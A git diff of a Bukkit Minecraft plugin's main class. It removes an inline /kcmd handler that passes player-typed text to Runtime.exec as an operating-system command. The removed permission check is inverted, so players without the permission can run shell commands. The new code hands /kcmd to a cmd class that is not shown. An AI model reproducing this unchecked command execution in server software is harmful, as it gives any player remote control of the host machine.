@@ -1,56 +1,20 @@
 package karonus.commander;
 
-import java.io.IOException;
-
-import org.bukkit.command.Command;
-import org.bukkit.command.CommandSender;
+import org.bukkit.command.CommandExecutor;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class main extends JavaPlugin {
+	public static main instance;
+	
+	public static api api;
+	
 	public void onEnable() {
+		instance = this;
 		
-	}
-	
-	public void onDisable() {
+		api = new api();
 		
-	}
-	
-	public static boolean sendCommand(String cmd) {
-		try {
-			Runtime.getRuntime().exec(cmd);
-			
-			return true;
-		} catch (IOException e) {
-			e.printStackTrace();
-			
-			return false;
-		}
-	}
-	
-	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
-		if (args.length >= 1 && cmd.getName().equalsIgnoreCase("kcmd")) {
-			StringBuilder argsPar = new StringBuilder();
-			for (int i = 0; i < args.length; i++) argsPar.append(args[i]).append(' ');
-			if (argsPar.length() > 0) argsPar.deleteCharAt(argsPar.length() - 1);
-			String command = argsPar.toString();
-			
-			if (sender.hasPermission("commander.cmd")) {
-				sender.sendMessage("§cError! You don't have permissions.");
-				
-				return true;
-			}
-			
-			if (sendCommand(command) == true) {
-				sender.sendMessage("§aSuccess!");
-				
-				return true;
-			} else {
-				sender.sendMessage("§cError!");
-				
-				return true;
-			}
-		}
+		this.getServer().getPluginManager().registerEvents(new events(), this);
 		
-		return false;
+		this.getCommand("kcmd").setExecutor((CommandExecutor)new cmd());
 	}
 }
